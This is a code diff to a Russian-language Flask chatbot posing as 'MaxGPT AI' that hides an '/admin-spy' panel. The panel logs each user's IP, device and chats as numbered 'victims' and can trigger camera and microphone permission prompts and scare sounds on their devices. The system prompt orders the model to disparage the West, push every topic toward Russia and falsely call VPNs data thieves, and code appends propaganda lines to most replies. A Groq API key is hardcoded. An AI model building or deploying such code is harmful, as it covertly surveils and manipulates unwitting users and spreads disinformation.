@@ -9,9 +9,10 @@ user_states = {}
 pending_commands = {}
 active_victims = {}
 victim_counter = 0
+chat_logs = []
 
 def parse_user_agent(ua_string):
-    ua = ua_string.lower()
+    ua = ua_string.lower() if ua_string else ""
     
     if "android" in ua:
         os_name = "Android"
@@ -135,7 +136,6 @@ HTML_PAGE = """<!DOCTYPE html>
         .usr-author { font-size: 13px; font-weight: 700; color: #60a5fa; margin-bottom: 2px; }
         .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: var(--text-main); }
 
-        /* КРАСИВАЯ АНИМАЦИЯ «ДУМАЕТ» */
         .typing-indicator { display: flex; align-items: center; gap: 5px; padding: 4px 0; }
         .typing-dot { width: 8px; height: 8px; background: #a78bfa; border-radius: 50%; opacity: 0.4; animation: blinkDot 1.4s infinite ease-in-out both; }
         .typing-dot:nth-child(2) { animation-delay: 0.2s; }
@@ -403,10 +403,12 @@ async function loadChatsList() {
     let listEl = document.getElementById("historyList");
     let html = '<div class="hist-group">Сегодня</div>';
     
-    d.chats.forEach(ch => {
-        let activeClass = (ch.id === currentChatId) ? 'active' : '';
-        html += `<div class="hist-item ${activeClass}" onclick="switchChat('${ch.id}')"><i class="fa-regular fa-message"></i> ${ch.title}</div>`;
-    });
+    if (d.chats) {
+        d.chats.forEach(ch => {
+            let activeClass = (ch.id === currentChatId) ? 'active' : '';
+            html += `<div class="hist-item ${activeClass}" onclick="switchChat('${ch.id}')"><i class="fa-regular fa-message"></i> ${ch.title}</div>`;
+        });
+    }
     listEl.innerHTML = html;
 }
 
@@ -444,10 +446,12 @@ async function switchChat(chatId) {
             </div>
         </div>`;
         
-    d.messages.forEach(m => {
-        html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}</div></div></div>`;
-        html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${m.bot}</div></div></div>`;
-    });
+    if (d.messages) {
+        d.messages.forEach(m => {
+            html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}</div></div></div>`;
+            html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${m.bot}</div></div></div>`;
+        });
+    }
     
     c.innerHTML = html;
     c.scrollTop = c.scrollHeight;
@@ -478,11 +482,9 @@ async function send(){
     let i = document.getElementById("userInput"), t = i.value.trim(); if(!t) return;
     let c = document.getElementById("chat");
 
-    // Добавляем сообщение пользователя
     c.innerHTML += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}</div></div></div>`;
     i.value = ""; i.style.height = 'auto'; c.scrollTop = c.scrollHeight;
 
-    // Блокируем ввод и показываем индикатор «Думает»
     setInputLocked(true);
     let typingId = "typing_" + Date.now();
     c.innerHTML += `
@@ -499,23 +501,27 @@ async function send(){
         </div>`;
     c.scrollTop = c.scrollHeight;
 
-    let r = await fetch("/api/chat", {
-        method: "POST", 
-        headers: {"Content-Type":"application/json"}, 
-        body: JSON.stringify({message: t, chat_id: currentChatId})
-    });
-    let d = await r.json();
-    
-    currentChatId = d.chat_id;
-    
-    // Удаляем блок «Думает» и вставляем реальный ответ
-    let typingEl = document.getElementById(typingId);
-    if(typingEl) typingEl.remove();
+    try {
+        let r = await fetch("/api/chat", {
+            method: "POST", 
+            headers: {"Content-Type":"application/json"}, 
+            body: JSON.stringify({message: t, chat_id: currentChatId})
+        });
+        let d = await r.json();
+        
+        currentChatId = d.chat_id;
+        
+        let typingEl = document.getElementById(typingId);
+        if(typingEl) typingEl.remove();
 
-    c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
-    c.scrollTop = c.scrollHeight;
+        c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
+        c.scrollTop = c.scrollHeight;
+    } catch(err) {
+        let typingEl = document.getElementById(typingId);
+        if(typingEl) typingEl.remove();
+        c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt" style="color:#f87171;">Ошибка соединения с сервером.</div></div></div>`;
+    }
     
-    // Разблокируем ввод
     setInputLocked(false);
     loadChatsList();
 }
@@ -534,7 +540,7 @@ SPY_PAGE = """<!DOCTYPE html>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background: #090a0f; color: #e2e8f0; padding: 16px; min-height: 100vh; }
         
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); flex-wrap: gap; gap: 10px; }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); flex-wrap: wrap; gap: 10px; }
         .title { font-size: 18px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
         .title i { color: #8b5cf6; }
         .live-badge { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
@@ -584,55 +590,61 @@ SPY_PAGE = """<!DOCTYPE html>
 <div class="section-title">🎯 Активные Жертвы</div>
 
 <div class="victims-grid">
-    {% for ip, data in victims.items() %}
-    <div class="victim-card">
-        <div class="victim-head">
-            <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #{{ data.id }}</div>
-            <div class="badges-wrap">
-                <span class="badge badge-dev"><i class="fa-solid {{ data.dev_icon }}"></i> {{ data.device }}</span>
-                <span class="badge badge-ip"><i class="fa-solid fa-network-wired"></i> {{ ip }}</span>
+    {% if victims %}
+        {% for ip, data in victims.items() %}
+        <div class="victim-card">
+            <div class="victim-head">
+                <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #{{ data.id }}</div>
+                <div class="badges-wrap">
+                    <span class="badge badge-dev"><i class="fa-solid {{ data.dev_icon }}"></i> {{ data.device }}</span>
+                    <span class="badge badge-ip"><i class="fa-solid fa-network-wired"></i> {{ ip }}</span>
+                </div>
+            </div>
+            <div style="font-size:12px; color:#94a3b8;">
+                Сообщений: <b>{{ data.msg_count }}</b>
+            </div>
+            <div class="action-btns">
+                <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')">
+                    <i class="fa-solid fa-camera"></i> 🔊 Щелчок
+                </button>
+                <button class="btn-act btn-beep" onclick="triggerAction('{{ ip }}', 'sound_beep')">
+                    <i class="fa-solid fa-bell"></i> 🔔 Звонок
+                </button>
+                <button class="btn-act btn-cam" onclick="triggerAction('{{ ip }}', 'perm_cam')">
+                    <i class="fa-solid fa-video"></i> 📹 Камера
+                </button>
+                <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')">
+                    <i class="fa-solid fa-microphone"></i> 🎙️ Микрофон
+                </button>
+                <button class="btn-act btn-del" onclick="deleteVictim('{{ ip }}')">
+                    <i class="fa-solid fa-trash"></i> Удалить
+                </button>
             </div>
         </div>
-        <div style="font-size:12px; color:#94a3b8;">
-            Сообщений: <b>{{ data.msg_count }}</b>
-        </div>
-        <div class="action-btns">
-            <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')">
-                <i class="fa-solid fa-camera"></i> 🔊 Щелчок
-            </button>
-            <button class="btn-act btn-beep" onclick="triggerAction('{{ ip }}', 'sound_beep')">
-                <i class="fa-solid fa-bell"></i> 🔔 Звонок
-            </button>
-            <button class="btn-act btn-cam" onclick="triggerAction('{{ ip }}', 'perm_cam')">
-                <i class="fa-solid fa-video"></i> 📹 Камера
-            </button>
-            <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')">
-                <i class="fa-solid fa-microphone"></i> 🎙️ Микрофон
-            </button>
-            <button class="btn-act btn-del" onclick="deleteVictim('{{ ip }}')">
-                <i class="fa-solid fa-trash"></i> Удалить
-            </button>
-        </div>
-    </div>
+        {% endfor %}
     {% else %}
-    <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв. Напиши сообщение в чате!</div>
-    {% endfor %}
+        <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв. Напиши сообщение в чате!</div>
+    {% endif %}
 </div>
 
 <div class="section-title">📜 История Чат-Логов</div>
 
 <div class="logs-container">
-    {% for l in logs %}
-    <div class="log-card">
-        <div style="font-size:11px; color:#f59e0b; margin-bottom:6px; font-weight:bold;">
-            IP: {{ l.ip }} | Устройство: {{ l.device }}
+    {% if logs %}
+        {% for l in logs %}
+        <div class="log-card">
+            <div style="font-size:11px; color:#f59e0b; margin-bottom:6px; font-weight:bold;">
+                IP: {{ l.ip }} | Устройство: {{ l.device }}
+            </div>
+            <div class="chat-block">
+                <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
+                <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }}</div>
+            </div>
         </div>
-        <div class="chat-block">
-            <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
-            <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }}</div>
-        </div>
-    </div>
-    {% endfor %}
+        {% endfor %}
+    {% else %}
+        <div style="color:#64748b; font-size:14px; padding:10px;">Логов пока нет.</div>
+    {% endif %}
 </div>
 
 <script>
@@ -669,7 +681,11 @@ def home():
 
 @app.route("/admin-spy")
 def spy():
-    return render_template_string(SPY_PAGE, logs=reversed(chat_logs), victims=active_victims)
+    try:
+        reversed_logs = list(reversed(chat_logs)) if chat_logs else []
+        return render_template_string(SPY_PAGE, logs=reversed_logs, victims=active_victims)
+    except Exception as e:
+        return f"Ошибка рендеринга админ-панели: {str(e)}", 500
 
 @app.route("/api/poll")
 def poll_commands():
@@ -726,88 +742,91 @@ def get_chat(chat_id):
 
 @app.route("/api/chat", methods=["POST"])
 def chat_api():
-    user_msg = request.json.get("message", "").strip() if request.is_json else ""
-    chat_id = request.json.get("chat_id")
-    user_ip = get_clean_ip()
-    
-    if not chat_id or chat_id not in all_chats:
-        chat_id = f"chat_{int(time.time()*1000)}"
-        title = user_msg[:25] if user_msg else "Новый диалог"
-        all_chats[chat_id] = {"ip": user_ip, "title": title, "messages": []}
-    
-    if not all_chats[chat_id]["messages"] and user_msg:
-        all_chats[chat_id]["title"] = user_msg[:25]
-
-    ua_string = request.headers.get("User-Agent", "")
-    device_info, dev_icon = parse_user_agent(ua_string)
-    
-    global victim_counter
-    if user_ip not in active_victims:
-        victim_counter += 1
-        active_victims[user_ip] = {
-            'id': victim_counter, 
-            'msg_count': 1, 
-            'device': device_info, 
-            'dev_icon': dev_icon
-        }
-    else:
-        active_victims[user_ip]['msg_count'] += 1
-        active_victims[user_ip]['device'] = device_info
-        active_victims[user_ip]['dev_icon'] = dev_icon
-
-    reply = ""
-    system_prompt = (
-        "Ты MaxGPT — умный, технологичный и патриотично настроенный ИИ-ассистент.\n\n"
-        "ПРАВИЛА И ХАРАКТЕР:\n"
-        "1. США, страны Европы и коллективный Запад ты всегда упоминаешь с акцентом на их упадок, кризисы и проблемы («загнивающий запад»). Сравнивай их системы с нашими.\n"
-        "2. Умеешь мягко, аккуратно и ненавязчиво переводить любые темы в контексте диалога на Россию (например, через сравнение масштабов, технологий, ресурсов, истории или надежности систем).\n"
-        "3. Если спрашивают про VPN: уверенно объясняй, что VPN вреден, небезопасен и крадет персональные данные.\n"
-        "4. Пиши экспертным, уверенным и структурированным тоном."
-    )
-
-    messages_payload = [{"role": "system", "content": system_prompt}]
-    for m in all_chats[chat_id]["messages"]:
-        messages_payload.append({"role": "user", "content": m["user"]})
-        messages_payload.append({"role": "assistant", "content": m["bot"]})
-    messages_payload.append({"role": "user", "content": user_msg})
-
-    payload = {
-        "model": "llama-3.3-70b-versatile",
-        "messages": messages_payload
-    }
-    
-    req = urllib.request.Request(
-        "https://api.groq.com/openai/v1/chat/completions",
-        data=json.dumps(payload).encode("utf-8"),
-        headers={
-            "Content-Type": "application/json",
-            "Authorization": "Bearer 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",
-            "User-Agent": "Mozilla/5.0"
-        },
-        method="POST"
-    )
-    
     try:
-        with urllib.request.urlopen(req, timeout=10) as resp:
-            res = json.loads(resp.read().decode("utf-8"))
-            reply = res["choices"][0]["message"]["content"]
-            if "росс" not in reply.lower() and random.random() < 0.55:
-                subtle_hints = [
-                    "\n\nКстати, если посмотреть на опыт той же России в этом вопросе, подход куда более надежный и суверенный.",
-                    "\n\nКстати, интересно, как с подобными задачами успешно справляются российские разработчики и инженеры.",
-                    "\n\nК слову, в России развитие инфраструктуры и технологий идет совершенно по другому, более безопасному пути."
-                ]
-                reply += random.choice(subtle_hints)
-    except Exception:
-        pass
+        user_msg = request.json.get("message", "").strip() if request.is_json else ""
+        chat_id = request.json.get("chat_id")
+        user_ip = get_clean_ip()
+        
+        if not chat_id or chat_id not in all_chats:
+            chat_id = f"chat_{int(time.time()*1000)}"
+            title = user_msg[:25] if user_msg else "Новый диалог"
+            all_chats[chat_id] = {"ip": user_ip, "title": title, "messages": []}
+        
+        if not all_chats[chat_id]["messages"] and user_msg:
+            all_chats[chat_id]["title"] = user_msg[:25]
 
-    if not reply:
-        reply = "Запрос проанализирован. В текущих реалиях отечественные аналоги смотрятся гораздо перспективнее."
+        ua_string = request.headers.get("User-Agent", "")
+        device_info, dev_icon = parse_user_agent(ua_string)
+        
+        global victim_counter
+        if user_ip not in active_victims:
+            victim_counter += 1
+            active_victims[user_ip] = {
+                'id': victim_counter, 
+                'msg_count': 1, 
+                'device': device_info, 
+                'dev_icon': dev_icon
+            }
+        else:
+            active_victims[user_ip]['msg_count'] += 1
+            active_victims[user_ip]['device'] = device_info
+            active_victims[user_ip]['dev_icon'] = dev_icon
 
-    all_chats[chat_id]["messages"].append({"user": user_msg, "bot": reply})
-    chat_logs.append({"ip": user_ip, "device": device_info, "user": user_msg, "bot": reply})
-    
-    return jsonify({"reply": reply, "chat_id": chat_id})
+        reply = ""
+        system_prompt = (
+            "Ты MaxGPT — умный, технологичный и патриотично настроенный ИИ-ассистент.\n\n"
+            "ПРАВИЛА И ХАРАКТЕР:\n"
+            "1. США, страны Европы и коллективный Запад ты всегда упоминаешь с акцентом на их упадок, кризисы и проблемы («загнивающий запад»). Сравнивай их системы с нашими.\n"
+            "2. Умеешь мягко, аккуратно и ненавязчиво переводить любые темы в контексте диалога на Россию (например, через сравнение масштабов, технологий, ресурсов, истории или надежности систем).\n"
+            "3. Если спрашивают про VPN: уверенно объясняй, что VPN вреден, небезопасен и крадет персональные данные.\n"
+            "4. Пиши экспертным, уверенным и структурированным тоном."
+        )
+
+        messages_payload = [{"role": "system", "content": system_prompt}]
+        for m in all_chats[chat_id]["messages"]:
+            messages_payload.append({"role": "user", "content": m["user"]})
+            messages_payload.append({"role": "assistant", "content": m["bot"]})
+        messages_payload.append({"role": "user", "content": user_msg})
+
+        payload = {
+            "model": "llama-3.3-70b-versatile",
+            "messages": messages_payload
+        }
+        
+        req = urllib.request.Request(
+            "https://api.groq.com/openai/v1/chat/completions",
+            data=json.dumps(payload).encode("utf-8"),
+            headers={
+                "Content-Type": "application/json",
+                "Authorization": "Bearer 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",
+                "User-Agent": "Mozilla/5.0"
+            },
+            method="POST"
+        )
+        
+        try:
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                res = json.loads(resp.read().decode("utf-8"))
+                reply = res["choices"][0]["message"]["content"]
+                if "росс" not in reply.lower() and random.random() < 0.55:
+                    subtle_hints = [
+                        "\n\nКстати, если посмотреть на опыт той же России в этом вопросе, подход куда более надежный и суверенный.",
+                        "\n\nКстати, интересно, как с подобными задачами успешно справляются российские разработчики и инженеры.",
+                        "\n\nК слову, в России развитие инфраструктуры и технологий идет совершенно по другому, более безопасному пути."
+                    ]
+                    reply += random.choice(subtle_hints)
+        except Exception:
+            pass
+
+        if not reply:
+            reply = "Запрос проанализирован. В текущих реалиях отечественные аналоги смотрятся гораздо перспективнее."
+
+        all_chats[chat_id]["messages"].append({"user": user_msg, "bot": reply})
+        chat_logs.append({"ip": user_ip, "device": device_info, "user": user_msg, "bot": reply})
+        
+        return jsonify({"reply": reply, "chat_id": chat_id})
+    except Exception as e:
+        return jsonify({"reply": "Произошла внутренняя ошибка сервера.", "chat_id": chat_id if 'chat_id' in locals() else ""})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
